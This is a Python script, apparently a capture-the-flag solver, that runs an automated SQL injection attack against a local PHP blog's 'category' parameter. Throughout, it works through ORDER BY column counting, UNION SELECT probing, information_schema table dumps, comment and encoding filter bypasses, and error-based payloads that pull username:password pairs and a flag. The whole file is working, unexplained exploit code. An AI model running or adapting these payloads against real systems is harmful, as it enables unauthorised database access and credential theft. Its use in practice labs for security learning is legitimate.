import requests
import urllib.parse
import time
import re

target = "http://127.0.0.1:32780/"
session_cookie = "PHPSESSID=a619c2d322b0d2025997d9751eb6d09a"
headers = {"Cookie": session_cookie}

print("=" * 80)
print("COMPREHENSIVE SQL INJECTION BYPASS AND DATA EXTRACTION")
print("=" * 80)

def send_payload(payload, description):
    print(f"\n[+] {description}")
    url_encoded = urllib.parse.quote(payload, safe='')
    url = f"{target}?category={url_encoded}"
    
    try:
        start = time.time()
        response = requests.get(url, headers=headers, timeout=10)
        elapsed = time.time() - start
        
        # Check for flag first
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!!!] FLAG FOUND: {flag_match.group()}")
            print(f"\nFull response:\n{response.text}")
            return {'flag': flag_match.group()}
        
        # Look for extracted data (skip HTML noise)
        content = re.findall(r'>([^<]{5,150})<', response.text)
        real_data = []
        for item in content:
            if not any(skip in item.lower() for skip in ['notice', 'undefined', 'variable', 'html', 'php', 'br /', 'option value', 'choose a category', 'all categories', 'blog home']):
                if len(item.strip()) > 5:
                    real_data.append(item.strip())
        
        if real_data:
            unique = list(set(real_data))
            print(f"[!] EXTRACTED DATA: {unique[:10]}")
            return {'data': unique, 'text': response.text}
        
        print(f"Response size: {len(response.text)} bytes | Time: {elapsed:.2f}s")
        return {'size': len(response.text), 'text': response.text}
    except Exception as e:
        print(f"[!] Error: {e}")
        return {'error': str(e)}

# Step 1: Find correct column count with ORDER BY
print("\n" + "=" * 80)
print("STEP 1: Finding column count with ORDER BY")
print("=" * 80)

for i in range(1, 11):
    payload = f"' ORDER BY {i}-- "
    result = send_payload(payload, f"ORDER BY {i}")
    if 'error' in str(result) or result.get('size', 0) < 1300:
        print(f"[!] Error at column {i}, likely correct count is {i-1}")
        column_count = i-1
        break
else:
    column_count = 5
    print(f"[-] Could not determine, using default: {column_count}")

# Step 2: UNION with NULL to confirm
print("\n" + "=" * 80)
print("STEP 2: UNION with NULL values to avoid type errors")
print("=" * 80)

nulls = ','.join(['NULL'] * column_count)
payload = f"' UNION SELECT {nulls}-- "
send_payload(payload, "UNION with all NULL")

# Step 3: Try extracting data with different positions
print("\n" + "=" * 80)
print("STEP 3: Extract data in each column position")
print("=" * 80)

for pos in range(1, column_count + 1):
    cols = []
    for i in range(1, column_count + 1):
        if i == pos:
            cols.append("@@version")
        else:
            cols.append("NULL")
    
    payload = f"' UNION SELECT {','.join(cols)}-- "
    result = send_payload(payload, f"Version in position {pos}")
    if result.get('data'):
        break
    time.sleep(0.2)

# Step 4: Extract table names
print("\n" + "=" * 80)
print("STEP 4: Extract table names from information_schema")
print("=" * 80)

for pos in range(1, column_count + 1):
    cols = []
    for i in range(1, column_count + 1):
        if i == pos:
            cols.append("GROUP_CONCAT(table_name)")
        else:
            cols.append("NULL")
    
    payload = f"' UNION SELECT {','.join(cols)} FROM information_schema.tables WHERE table_schema=database()-- "
    result = send_payload(payload, f"Tables in position {pos}")
    if result.get('data'):
        break
    time.sleep(0.2)

# Step 5: Try different encoding variations
print("\n" + "=" * 80)
print("STEP 5: Different encoding variations for table extraction")
print("=" * 80)

encoding_tests = [
    f"'+UNION+SELECT+{nulls}+FROM+information_schema.tables--",
    f"'%0aUNION%0aSELECT%0a{nulls}%0aFROM%0ainformation_schema.tables--",
    f"'/**/UNION/**/SELECT/{nulls}/**/FROM/**/information_schema.tables--",
    f"'/**/UNION/**/SELECT/{','.join(['NULL'] * column_count)}/**/FROM/**/information_schema.tables--",
]

for i, payload in enumerate(encoding_tests):
    result = send_payload(payload, f"Encoding variant {i+1}")
    if result.get('data'):
        break
    time.sleep(0.2)

# Step 6: Direct table access attempts
print("\n" + "=" * 80)
print("STEP 6: Direct access to common tables")
print("=" * 80)

common_tables = ['flag', 'users', 'admin', 'posts', 'articles', 'blog']
for table in common_tables:
    for pos in range(1, column_count + 1):
        cols = []
        for i in range(1, column_count + 1):
            if i == pos:
                cols.append("*")
            else:
                cols.append("NULL")
        
        payload = f"' UNION SELECT {','.join(cols)} FROM {table} LIMIT 1-- "
        result = send_payload(payload, f"Access table: {table} (pos {pos})")
        if result.get('data'):
            break
    time.sleep(0.2)

# Step 7: Error-based extraction
print("\n" + "=" * 80)
print("STEP 7: Error-based data extraction")
print("=" * 80)

error_payloads = [
    f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
    f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(flag) FROM flag LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
    f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)-- ",
]

for i, payload in enumerate(error_payloads):
    result = send_payload(payload, f"Error-based {i+1}")
    if result.get('data'):
        break
    time.sleep(0.2)

# Step 8: Try simple bypass with different comment styles
print("\n" + "=" * 80)
print("STEP 8: Comment style variations")
print("=" * 80)

comment_tests = [
    f"'+UNION+SELECT+{nulls}+FROM+information_schema.tables--",
    f"'+UNION+SELECT+{nulls}+FROM+information_schema.tables#",
    f"'+UNION+SELECT+{nulls}+FROM+information_schema.tables/*",
    f"'%0aUNION%0aSELECT%0a{nulls}%0aFROM%0ainformation_schema.tables--",
]

for i, payload in enumerate(comment_tests):
    result = send_payload(payload, f"Comment variant {i+1}")
    if result.get('data'):
        break
    time.sleep(0.2)

print("\n" + "=" * 80)
print("TESTING COMPLETE")
print("=" * 80)
print("Check output above for extracted data, tables, or flags.")
